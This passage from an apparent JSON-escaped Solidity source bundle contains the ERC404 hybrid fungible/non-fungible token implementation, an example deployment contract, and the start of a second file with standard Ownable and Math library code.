if (erc721Owner == address(0)) {\\n      revert NotFound();\\n    }\\n  }\\n\\n  function owned(\\n    address owner_\\n  ) public view virtual returns (uint256[] memory) {\\n    return _owned[owner_];\\n  }\\n\\n  function erc721BalanceOf(\\n    address owner_\\n  ) public view virtual returns (uint256) {\\n    return _owned[owner_].length;\\n  }\\n\\n  function erc20BalanceOf(\\n    address owner_\\n  ) public view virtual returns (uint256) {\\n    return balanceOf[owner_];\\n  }\\n\\n  function erc20TotalSupply() public view virtual returns (uint256) {\\n    return totalSupply;\\n  }\\n\\n  function erc721TotalSupply() public view virtual returns (uint256) {\\n    return minted;\\n  }\\n\\n  function getERC721QueueLength() public view virtual returns (uint256) {\\n    return _storedERC721Ids.length();\\n  }\\n\\n  function getERC721TokensInQueue(\\n    uint256 start_,\\n    uint256 count_\\n  ) public view virtual returns (uint256[] memory) {\\n    uint256[] memory tokensInQueue = new uint256[](count_);\\n\\n    for (uint256 i = start_; i < start_ + count_; ) {\\n      tokensInQueue[i - start_] = _storedERC721Ids.at(i);\\n\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n\\n    return tokensInQueue;\\n  }\\n\\n  /// @notice tokenURI must be implemented by child contract\\n  function tokenURI(uint256 id_) public view virtual returns (string memory);\\n\\n  /// @notice Function for token approvals\\n  /// @dev This function assumes the operator is attempting to approve\\n  ///      an ERC-721 if valueOrId_ is a possibly valid ERC-721 token id.\\n  ///      Unlike setApprovalForAll, spender_ must be allowed to be 0x0 so\\n  ///      that approval can be revoked.\\n  function approve(\\n    address spender_,\\n    uint256 valueOrId_\\n  ) public virtual returns (bool) {\\n    if (_isValidTokenId(valueOrId_)) {\\n      erc721Approve(spender_, valueOrId_);\\n    } else {\\n      return erc20Approve(spender_, valueOrId_);\\n    }\\n\\n    return true;\\n  }\\n\\n  function erc721Approve(address spender_, uint256 id_) public virtual {\\n    // Intention is to approve as ERC-721 token (id).\\n    address erc721Owner = _getOwnerOf(id_);\\n\\n    if (\\n      msg.sender != erc721Owner && !isApprovedForAll[erc721Owner][msg.sender]\\n    ) {\\n      revert Unauthorized();\\n    }\\n\\n    getApproved[id_] = spender_;\\n\\n    emit ERC721Events.Approval(erc721Owner, spender_, id_);\\n  }\\n\\n  /// @dev Providing type(uint256).max for approval value results in an\\n  ///      unlimited approval that is not deducted from on transfers.\\n  function erc20Approve(\\n    address spender_,\\n    uint256 value_\\n  ) public virtual returns (bool) {\\n    // Prevent granting 0x0 an ERC-20 allowance.\\n    if (spender_ == address(0)) {\\n      revert InvalidSpender();\\n    }\\n\\n    allowance[msg.sender][spender_] = value_;\\n\\n    emit ERC20Events.Approval(msg.sender, spender_, value_);\\n\\n    return true;\\n  }\\n\\n  /// @notice Function for ERC-721 approvals\\n  function setApprovalForAll(address operator_, bool approved_) public virtual {\\n    // Prevent approvals to 0x0.\\n    if (operator_ == address(0)) {\\n      revert InvalidOperator();\\n    }\\n    isApprovedForAll[msg.sender][operator_] = approved_;\\n    emit ERC721Events.ApprovalForAll(msg.sender, operator_, approved_);\\n  }\\n\\n  /// @notice Function for mixed transfers from an operator that may be different than 'from'.\\n  /// @dev This function assumes the operator is attempting to transfer an ERC-721\\n  ///      if valueOrId is a possible valid token id.\\n  function transferFrom(\\n    address from_,\\n    address to_,\\n    uint256 valueOrId_\\n  ) public virtual returns (bool) {\\n    if (_isValidTokenId(valueOrId_)) {\\n      erc721TransferFrom(from_, to_, valueOrId_);\\n    } else {\\n      // Intention is to transfer as ERC-20 token (value).\\n      return erc20TransferFrom(from_, to_, valueOrId_);\\n    }\\n\\n    return true;\\n  }\\n\\n  /// @notice Function for ERC-721 transfers from.\\n  /// @dev This function is recommended for ERC721 transfers.\\n  function erc721TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) public virtual {\\n    // Prevent minting tokens from 0x0.\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    if (from_ != _getOwnerOf(id_)) {\\n      revert Unauthorized();\\n    }\\n\\n    // Check that the operator is either the sender or approved for the transfer.\\n    if (\\n      msg.sender != from_ &&\\n      !isApprovedForAll[from_][msg.sender] &&\\n      msg.sender != getApproved[id_]\\n    ) {\\n      revert Unauthorized();\\n    }\\n\\n    // We only need to check ERC-721 transfer exempt status for the recipient\\n    // since the sender being ERC-721 transfer exempt means they have already\\n    // had their ERC-721s stripped away during the rebalancing process.\\n    if (erc721TransferExempt(to_)) {\\n      revert RecipientIsERC721TransferExempt();\\n    }\\n\\n    // Transfer 1 * units ERC-20 and 1 ERC-721 token.\\n    // ERC-721 transfer exemptions handled above. Can't make it to this point if either is transfer exempt.\\n    _transferERC20(from_, to_, units);\\n    _transferERC721(from_, to_, id_);\\n  }\\n\\n  /// @notice Function for ERC-20 transfers from.\\n  /// @dev This function is recommended for ERC20 transfers\\n  function erc20TransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) public virtual returns (bool) {\\n    // Prevent minting tokens from 0x0.\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    uint256 allowed = allowance[from_][msg.sender];\\n\\n    // Check that the operator has sufficient allowance.\\n    if (allowed != type(uint256).max) {\\n      allowance[from_][msg.sender] = allowed - value_;\\n    }\\n\\n    // Transferring ERC-20s directly requires the _transferERC20WithERC721 function.\\n    // Handles ERC-721 exemptions internally.\\n    return _transferERC20WithERC721(from_, to_, value_);\\n  }\\n\\n  /// @notice Function for ERC-20 transfers.\\n  /// @dev This function assumes the operator is attempting to transfer as ERC-20\\n  ///      given this function is only supported on the ERC-20 interface.\\n  ///      Treats even large amounts that are valid ERC-721 ids as ERC-20s.\\n  function transfer(address to_, uint256 value_) public virtual returns (bool) {\\n    // Prevent burning tokens to 0x0.\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    // Transferring ERC-20s directly requires the _transferERC20WithERC721 function.\\n    // Handles ERC-721 exemptions internally.\\n    return _transferERC20WithERC721(msg.sender, to_, value_);\\n  }\\n\\n  /// @notice Function for ERC-721 transfers with contract support.\\n  /// This function only supports moving valid ERC-721 ids, as it does not exist on the ERC-20\\n  /// spec and will revert otherwise.\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) public virtual {\\n    safeTransferFrom(from_, to_, id_, \\\"\\\");\\n  }\\n\\n  /// @notice Function for ERC-721 transfers with contract support and callback data.\\n  /// This function only supports moving valid ERC-721 ids, as it does not exist on the\\n  /// ERC-20 spec and will revert otherwise.\\n  function safeTransferFrom(\\n    address from_,\\n    address to_,\\n    uint256 id_,\\n    bytes memory data_\\n  ) public virtual {\\n    if (!_isValidTokenId(id_)) {\\n      revert InvalidTokenId();\\n    }\\n\\n    transferFrom(from_, to_, id_);\\n\\n    if (\\n      to_.code.length != 0 &&\\n      IERC721Receiver(to_).onERC721Received(msg.sender, from_, id_, data_) !=\\n      IERC721Receiver.onERC721Received.selector\\n    ) {\\n      revert UnsafeRecipient();\\n    }\\n  }\\n\\n  /// @notice Function for EIP-2612 permits (ERC-20 only).\\n  /// @dev Providing type(uint256).max for permit value results in an\\n  ///      unlimited approval that is not deducted from on transfers.\\n  function permit(\\n    address owner_,\\n    address spender_,\\n    uint256 value_,\\n    uint256 deadline_,\\n    uint8 v_,\\n    bytes32 r_,\\n    bytes32 s_\\n  ) public virtual {\\n    if (deadline_ < block.timestamp) {\\n      revert PermitDeadlineExpired();\\n    }\\n\\n    // permit cannot be used for ERC-721 token approvals, so ensure\\n    // the value does not fall within the valid range of ERC-721 token ids.\\n    if (_isValidTokenId(value_)) {\\n      revert InvalidApproval();\\n    }\\n\\n    if (spender_ == address(0)) {\\n      revert InvalidSpender();\\n    }\\n\\n    unchecked {\\n      address recoveredAddress = ecrecover(\\n        keccak256(\\n          abi.encodePacked(\\n            \\\"\\\\x19\\\\x01\\\",\\n            DOMAIN_SEPARATOR(),\\n            keccak256(\\n              abi.encode(\\n                keccak256(\\n                  \\\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\\\"\\n                ),\\n                owner_,\\n                spender_,\\n                value_,\\n                nonces[owner_]++,\\n                deadline_\\n              )\\n            )\\n          )\\n        ),\\n        v_,\\n        r_,\\n        s_\\n      );\\n\\n      if (recoveredAddress == address(0) || recoveredAddress != owner_) {\\n        revert InvalidSigner();\\n      }\\n\\n      allowance[recoveredAddress][spender_] = value_;\\n    }\\n\\n    emit ERC20Events.Approval(owner_, spender_, value_);\\n  }\\n\\n  /// @notice Returns domain initial domain separator, or recomputes if chain id is not equal to initial chain id\\n  function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {\\n    return\\n      block.chainid == _INITIAL_CHAIN_ID\\n        ? _INITIAL_DOMAIN_SEPARATOR\\n        : _computeDomainSeparator();\\n  }\\n\\n  function supportsInterface(\\n    bytes4 interfaceId\\n  ) public view virtual returns (bool) {\\n    return\\n      interfaceId == type(IERC404).interfaceId ||\\n      interfaceId == type(IERC165).interfaceId;\\n  }\\n\\n  /// @notice Function for self-exemption\\n  function setSelfERC721TransferExempt(bool state_) public virtual {\\n    _setERC721TransferExempt(msg.sender, state_);\\n  }\\n\\n  /// @notice Function to check if address is transfer exempt\\n  function erc721TransferExempt(\\n    address target_\\n  ) public view virtual returns (bool) {\\n    return target_ == address(0) || _erc721TransferExempt[target_];\\n  }\\n\\n  /// @notice For a token token id to be considered valid, it just needs\\n  ///         to fall within the range of possible token ids, it does not\\n  ///         necessarily have to be minted yet.\\n  function _isValidTokenId(uint256 id_) internal pure returns (bool) {\\n    return id_ > ID_ENCODING_PREFIX && id_ != type(uint256).max;\\n  }\\n\\n  /// @notice Internal function to compute domain separator for EIP-2612 permits\\n  function _computeDomainSeparator() internal view virtual returns (bytes32) {\\n    return\\n      keccak256(\\n        abi.encode(\\n          keccak256(\\n            \\\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\\\"\\n          ),\\n          keccak256(bytes(name)),\\n          keccak256(\\\"1\\\"),\\n          block.chainid,\\n          address(this)\\n        )\\n      );\\n  }\\n\\n  /// @notice This is the lowest level ERC-20 transfer function, which\\n  ///         should be used for both normal ERC-20 transfers as well as minting.\\n  /// Note that this function allows transfers to and from 0x0.\\n  function _transferERC20(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) internal virtual {\\n    // Minting is a special case for which we should not check the balance of\\n    // the sender, and we should increase the total supply.\\n    if (from_ == address(0)) {\\n      totalSupply += value_;\\n    } else {\\n      // Deduct value from sender's balance.\\n      balanceOf[from_] -= value_;\\n    }\\n\\n    // Update the recipient's balance.\\n    // Can be unchecked because on mint, adding to totalSupply is checked, and on transfer balance deduction is checked.\\n    unchecked {\\n      balanceOf[to_] += value_;\\n    }\\n\\n    emit ERC20Events.Transfer(from_, to_, value_);\\n  }\\n\\n  /// @notice Consolidated record keeping function for transferring ERC-721s.\\n  /// @dev Assign the token to the new owner, and remove from the old owner.\\n  /// Note that this function allows transfers to and from 0x0.\\n  /// Does not handle ERC-721 exemptions.\\n  function _transferERC721(\\n    address from_,\\n    address to_,\\n    uint256 id_\\n  ) internal virtual {\\n    // If this is not a mint, handle record keeping for transfer from previous owner.\\n    if (from_ != address(0)) {\\n      // On transfer of an NFT, any previous approval is reset.\\n      delete getApproved[id_];\\n\\n      uint256 updatedId = _owned[from_][_owned[from_].length - 1];\\n      if (updatedId != id_) {\\n        uint256 updatedIndex = _getOwnedIndex(id_);\\n        // update _owned for sender\\n        _owned[from_][updatedIndex] = updatedId;\\n        // update index for the moved id\\n        _setOwnedIndex(updatedId, updatedIndex);\\n      }\\n\\n      // pop\\n      _owned[from_].pop();\\n    }\\n\\n    // Check if this is a burn.\\n    if (to_ != address(0)) {\\n      // If not a burn, update the owner of the token to the new owner.\\n      // Update owner of the token to the new owner.\\n      _setOwnerOf(id_, to_);\\n      // Push token onto the new owner's stack.\\n      _owned[to_].push(id_);\\n      // Update index for new owner's stack.\\n      _setOwnedIndex(id_, _owned[to_].length - 1);\\n    } else {\\n      // If this is a burn, reset the owner of the token to 0x0 by deleting the token from _ownedData.\\n      delete _ownedData[id_];\\n    }\\n\\n    emit ERC721Events.Transfer(from_, to_, id_);\\n  }\\n\\n  /// @notice Internal function for ERC-20 transfers. Also handles any ERC-721 transfers that may be required.\\n  // Handles ERC-721 exemptions.\\n  function _transferERC20WithERC721(\\n    address from_,\\n    address to_,\\n    uint256 value_\\n  ) internal virtual returns (bool) {\\n    uint256 erc20BalanceOfSenderBefore = erc20BalanceOf(from_);\\n    uint256 erc20BalanceOfReceiverBefore = erc20BalanceOf(to_);\\n\\n    _transferERC20(from_, to_, value_);\\n\\n    // Preload for gas savings on branches\\n    bool isFromERC721TransferExempt = erc721TransferExempt(from_);\\n    bool isToERC721TransferExempt = erc721TransferExempt(to_);\\n\\n    // Skip _withdrawAndStoreERC721 and/or _retrieveOrMintERC721 for ERC-721 transfer exempt addresses\\n    // 1) to save gas\\n    // 2) because ERC-721 transfer exempt addresses won't always have/need ERC-721s corresponding to their ERC20s.\\n    if (isFromERC721TransferExempt && isToERC721TransferExempt) {\\n      // Case 1) Both sender and recipient are ERC-721 transfer exempt. No ERC-721s need to be transferred.\\n      // NOOP.\\n    } else if (isFromERC721TransferExempt) {\\n      // Case 2) The sender is ERC-721 transfer exempt, but the recipient is not. Contract should not attempt\\n      //         to transfer ERC-721s from the sender, but the recipient should receive ERC-721s\\n      //         from the bank/minted for any whole number increase in their balance.\\n      // Only cares about whole number increments.\\n      uint256 tokensToRetrieveOrMint = (balanceOf[to_] / units) -\\n        (erc20BalanceOfReceiverBefore / units);\\n      for (uint256 i = 0; i < tokensToRetrieveOrMint; ) {\\n        _retrieveOrMintERC721(to_);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n    } else if (isToERC721TransferExempt) {\\n      // Case 3) The sender is not ERC-721 transfer exempt, but the recipient is. Contract should attempt\\n      //         to withdraw and store ERC-721s from the sender, but the recipient should not\\n      //         receive ERC-721s from the bank/minted.\\n      // Only cares about whole number increments.\\n      uint256 tokensToWithdrawAndStore = (erc20BalanceOfSenderBefore / units) -\\n        (balanceOf[from_] / units);\\n      for (uint256 i = 0; i < tokensToWithdrawAndStore; ) {\\n        _withdrawAndStoreERC721(from_);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n    } else {\\n      // Case 4) Neither the sender nor the recipient are ERC-721 transfer exempt.\\n      // Strategy:\\n      // 1. First deal with the whole tokens. These are easy and will just be transferred.\\n      // 2. Look at the fractional part of the value:\\n      //   a) If it causes the sender to lose a whole token that was represented by an NFT due to a\\n      //      fractional part being transferred, withdraw and store an additional NFT from the sender.\\n      //   b) If it causes the receiver to gain a whole new token that should be represented by an NFT\\n      //      due to receiving a fractional part that completes a whole token, retrieve or mint an NFT to the recevier.\\n\\n      // Whole tokens worth of ERC-20s get transferred as ERC-721s without any burning/minting.\\n      uint256 nftsToTransfer = value_ / units;\\n      for (uint256 i = 0; i < nftsToTransfer; ) {\\n        // Pop from sender's ERC-721 stack and transfer them (LIFO)\\n        uint256 indexOfLastToken = _owned[from_].length - 1;\\n        uint256 tokenId = _owned[from_][indexOfLastToken];\\n        _transferERC721(from_, to_, tokenId);\\n        unchecked {\\n          ++i;\\n        }\\n      }\\n\\n      // If the transfer changes either the sender or the recipient's holdings from a fractional to a non-fractional\\n      // amount (or vice versa), adjust ERC-721s.\\n\\n      // First check if the send causes the sender to lose a whole token that was represented by an ERC-721\\n      // due to a fractional part being transferred.\\n      //\\n      // Process:\\n      // Take the difference between the whole number of tokens before and after the transfer for the sender.\\n      // If that difference is greater than the number of ERC-721s transferred (whole units), then there was\\n      // an additional ERC-721 lost due to the fractional portion of the transfer.\\n      // If this is a self-send and the before and after balances are equal (not always the case but often),\\n      // then no ERC-721s will be lost here.\\n      if (\\n        erc20BalanceOfSenderBefore / units - erc20BalanceOf(from_) / units >\\n        nftsToTransfer\\n      ) {\\n        _withdrawAndStoreERC721(from_);\\n      }\\n\\n      // Then, check if the transfer causes the receiver to gain a whole new token which requires gaining\\n      // an additional ERC-721.\\n      //\\n      // Process:\\n      // Take the difference between the whole number of tokens before and after the transfer for the recipient.\\n      // If that difference is greater than the number of ERC-721s transferred (whole units), then there was\\n      // an additional ERC-721 gained due to the fractional portion of the transfer.\\n      // Again, for self-sends where the before and after balances are equal, no ERC-721s will be gained here.\\n      if (\\n        erc20BalanceOf(to_) / units - erc20BalanceOfReceiverBefore / units >\\n        nftsToTransfer\\n      ) {\\n        _retrieveOrMintERC721(to_);\\n      }\\n    }\\n\\n    return true;\\n  }\\n\\n  /// @notice Internal function for ERC20 minting\\n  /// @dev This function will allow minting of new ERC20s.\\n  ///      If mintCorrespondingERC721s_ is true, and the recipient is not ERC-721 exempt, it will\\n  ///      also mint the corresponding ERC721s.\\n  /// Handles ERC-721 exemptions.\\n  function _mintERC20(address to_, uint256 value_) internal virtual {\\n    /// You cannot mint to the zero address (you can't mint and immediately burn in the same transfer).\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    if (totalSupply + value_ > ID_ENCODING_PREFIX) {\\n      revert MintLimitReached();\\n    }\\n\\n    _transferERC20WithERC721(address(0), to_, value_);\\n  }\\n\\n  /// @notice Internal function for ERC-721 minting and retrieval from the bank.\\n  /// @dev This function will allow minting of new ERC-721s up to the total fractional supply. It will\\n  ///      first try to pull from the bank, and if the bank is empty, it will mint a new token.\\n  /// Does not handle ERC-721 exemptions.\\n  function _retrieveOrMintERC721(address to_) internal virtual {\\n    if (to_ == address(0)) {\\n      revert InvalidRecipient();\\n    }\\n\\n    uint256 id;\\n\\n    if (!_storedERC721Ids.empty()) {\\n      // If there are any tokens in the bank, use those first.\\n      // Pop off the end of the queue (FIFO).\\n      id = _storedERC721Ids.popBack();\\n    } else {\\n      // Otherwise, mint a new token, should not be able to go over the total fractional supply.\\n      ++minted;\\n\\n      // Reserve max uint256 for approvals\\n      if (minted == type(uint256).max) {\\n        revert MintLimitReached();\\n      }\\n\\n      id = ID_ENCODING_PREFIX + minted;\\n    }\\n\\n    address erc721Owner = _getOwnerOf(id);\\n\\n    // The token should not already belong to anyone besides 0x0 or this contract.\\n    // If it does, something is wrong, as this should never happen.\\n    if (erc721Owner != address(0)) {\\n      revert AlreadyExists();\\n    }\\n\\n    // Transfer the token to the recipient, either transferring from the contract's bank or minting.\\n    // Does not handle ERC-721 exemptions.\\n    _transferERC721(erc721Owner, to_, id);\\n  }\\n\\n  /// @notice Internal function for ERC-721 deposits to bank (this contract).\\n  /// @dev This function will allow depositing of ERC-721s to the bank, which can be retrieved by future minters.\\n  // Does not handle ERC-721 exemptions.\\n  function _withdrawAndStoreERC721(address from_) internal virtual {\\n    if (from_ == address(0)) {\\n      revert InvalidSender();\\n    }\\n\\n    // Retrieve the latest token added to the owner's stack (LIFO).\\n    uint256 id = _owned[from_][_owned[from_].length - 1];\\n\\n    // Transfer to 0x0.\\n    // Does not handle ERC-721 exemptions.\\n    _transferERC721(from_, address(0), id);\\n\\n    // Record the token in the contract's bank queue.\\n    _storedERC721Ids.pushFront(id);\\n  }\\n\\n  /// @notice Initialization function to set pairs / etc, saving gas by avoiding mint / burn on unnecessary targets\\n  function _setERC721TransferExempt(\\n    address target_,\\n    bool state_\\n  ) internal virtual {\\n    if (target_ == address(0)) {\\n      revert InvalidExemption();\\n    }\\n\\n    // Adjust the ERC721 balances of the target to respect exemption rules.\\n    // Despite this logic, it is still recommended practice to exempt prior to the target\\n    // having an active balance.\\n    if (state_) {\\n      _clearERC721Balance(target_);\\n    } else {\\n      _reinstateERC721Balance(target_);\\n    }\\n\\n    _erc721TransferExempt[target_] = state_;\\n  }\\n\\n  /// @notice Function to reinstate balance on exemption removal\\n  function _reinstateERC721Balance(address target_) private {\\n    uint256 expectedERC721Balance = erc20BalanceOf(target_) / units;\\n    uint256 actualERC721Balance = erc721BalanceOf(target_);\\n\\n    for (uint256 i = 0; i < expectedERC721Balance - actualERC721Balance; ) {\\n      // Transfer ERC721 balance in from pool\\n      _retrieveOrMintERC721(target_);\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n  }\\n\\n  /// @notice Function to clear balance on exemption inclusion\\n  function _clearERC721Balance(address target_) private {\\n    uint256 erc721Balance = erc721BalanceOf(target_);\\n\\n    for (uint256 i = 0; i < erc721Balance; ) {\\n      // Transfer out ERC721 balance\\n      _withdrawAndStoreERC721(target_);\\n      unchecked {\\n        ++i;\\n      }\\n    }\\n  }\\n\\n  function _getOwnerOf(\\n    uint256 id_\\n  ) internal view virtual returns (address ownerOf_) {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      ownerOf_ := and(data, _BITMASK_ADDRESS)\\n    }\\n  }\\n\\n  function _setOwnerOf(uint256 id_, address owner_) internal virtual {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      data := add(\\n        and(data, _BITMASK_OWNED_INDEX),\\n        and(owner_, _BITMASK_ADDRESS)\\n      )\\n    }\\n\\n    _ownedData[id_] = data;\\n  }\\n\\n  function _getOwnedIndex(\\n    uint256 id_\\n  ) internal view virtual returns (uint256 ownedIndex_) {\\n    uint256 data = _ownedData[id_];\\n\\n    assembly {\\n      ownedIndex_ := shr(160, data)\\n    }\\n  }\\n\\n  function _setOwnedIndex(uint256 id_, uint256 index_) internal virtual {\\n    uint256 data = _ownedData[id_];\\n\\n    if (index_ > _BITMASK_OWNED_INDEX >> 160) {\\n      revert OwnedIndexOverflow();\\n    }\\n\\n    assembly {\\n      data := add(\\n        and(data, _BITMASK_ADDRESS),\\n        and(shl(160, index_), _BITMASK_OWNED_INDEX)\\n      )\\n    }\\n\\n    _ownedData[id_] = data;\\n  }\\n}\\n\\n//SPDX-License-Identifier: MIT\\ncontract ERC404Example is Ownable, ERC404 {\\n  constructor(\\n    string memory name_,\\n    string memory symbol_,\\n    uint8 decimals_,\\n    uint256 maxTotalSupplyERC721_,\\n    address initialOwner_,\\n    address initialMintRecipient_\\n  ) ERC404(name_, symbol_, decimals_) Ownable(initialOwner_) {\\n    // Do not mint the ERC721s to the initial owner, as it's a waste of gas.\\n    _setERC721TransferExempt(initialMintRecipient_, true);\\n    _mintERC20(initialMintRecipient_, maxTotalSupplyERC721_ * units);\\n  }\\n\\n  function tokenURI(uint256 id_) public pure override returns (string memory) {\\n    return string.concat(\\\"https://example.com/token/\\\", Strings.toString(id_));\\n  }\\n\\n  function setERC721TransferExempt(\\n    address account_,\\n    bool value_\\n  ) external onlyOwner {\\n    _setERC721TransferExempt(account_, value_);\\n  }\\n}\"\r\n    },\r\n    \"contracts/examples/ERC404ExampleU16.sol\": {\r\n      \"content\": \"pragma solidity ^0.8.0;\\n\\n\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n\\n    function _contextSuffixLength() internal view virtual returns (uint256) {\\n        return 0;\\n    }\\n}\\n\\nabstract contract Ownable is Context {\\n    address private _owner;\\n\\n    /**\\n     * @dev The caller account is not authorized to perform an operation.\\n     */\\n    error OwnableUnauthorizedAccount(address account);\\n\\n    /**\\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\\n     */\\n    error OwnableInvalidOwner(address owner);\\n\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\n\\n    /**\\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\\n     */\\n    constructor(address initialOwner) {\\n        if (initialOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(initialOwner);\\n    }\\n\\n    /**\\n     * @dev Throws if called by any account other than the owner.\\n     */\\n    modifier onlyOwner() {\\n        _checkOwner();\\n        _;\\n    }\\n\\n    /**\\n     * @dev Returns the address of the current owner.\\n     */\\n    function owner() public view virtual returns (address) {\\n        return _owner;\\n    }\\n\\n    /**\\n     * @dev Throws if the sender is not the owner.\\n     */\\n    function _checkOwner() internal view virtual {\\n        if (owner() != _msgSender()) {\\n            revert OwnableUnauthorizedAccount(_msgSender());\\n        }\\n    }\\n\\n    /**\\n     * @dev Leaves the contract without owner. It will not be possible to call\\n     * `onlyOwner` functions. Can only be called by the current owner.\\n     *\\n     * NOTE: Renouncing ownership will leave the contract without an owner,\\n     * thereby disabling any functionality that is only available to the owner.\\n     */\\n    function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Can only be called by the current owner.\\n     */\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\n        if (newOwner == address(0)) {\\n            revert OwnableInvalidOwner(address(0));\\n        }\\n        _transferOwnership(newOwner);\\n    }\\n\\n    /**\\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\\n     * Internal function without access restriction.\\n     */\\n    function _transferOwnership(address newOwner) internal virtual {\\n        address oldOwner = _owner;\\n        _owner = newOwner;\\n        emit OwnershipTransferred(oldOwner, newOwner);\\n    }\\n}\\n\\nlibrary Math {\\n    /**\\n     * @dev Muldiv operation overflow.\\n     */\\n    error MathOverflowedMulDiv();\\n\\n    enum Rounding {\\n        Floor, // Toward negative infinity\\n        Ceil, // Toward positive infinity\\n        Trunc, // Toward zero\\n        Expand // Away from zero\\n    }\\n\\n    /**\\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\\n     */\\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            uint256 c = a + b;\\n            if (c < a) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\\n     */\\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b > a) return (false, 0);\\n            return (true, a - b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\\n     */\\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\\n            // benefit is lost if 'b' is also tested.\\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\n            if (a == 0) return (true, 0);\\n            uint256 c = a * b;\\n            if (c / a != b) return (false, 0);\\n            return (true, c);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\\n     */\\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a / b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\\n     */\\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\\n        unchecked {\\n            if (b == 0) return (false, 0);\\n            return (true, a % b);\\n        }\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds towards infinity instead\\n     * of rounding towards zero.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (b == 0) {\\n            // Guarantee the same behavior as in a regular Solidity division.\\n            return a / b;\\n        }\\n\\n        // (a + b - 1) / b can overflow on addition, so we distribute.\\n        return a == 0 ? 0 : (a - 1) / b + 1;\\n    }\\n\\n    /**\\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or\\n     * denominator == 0.\\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv) with further edits by\\n     * Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {\\n        unchecked {\\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n            // variables such that product = prod1 * 2^256 + prod0.\\n            uint256 prod0 = x * y; // Least significant 256 bits of the product\\n            uint256 prod1; // Most significant 256 bits of the product\\n            assembly {\\n                let mm := mulmod(x, y, not(0))\\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\\n            }\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (prod1 == 0) {\\n                // Solidity will revert if denominator == 0, unlike the div opcode on its own.\\n                // The surrounding unchecked block does not change this fact.\\n                // See https://docs.soliditylang.org/en/latest/control-structures.html#checked-or-unchecked-arithmetic.\\n                return prod0 / denominator;\\n            }\\n\\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\\n            if (denominator <= prod1) {\\n                revert MathOverflowedMulDiv();\\n            }\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [prod1 prod0].\\n            uint256 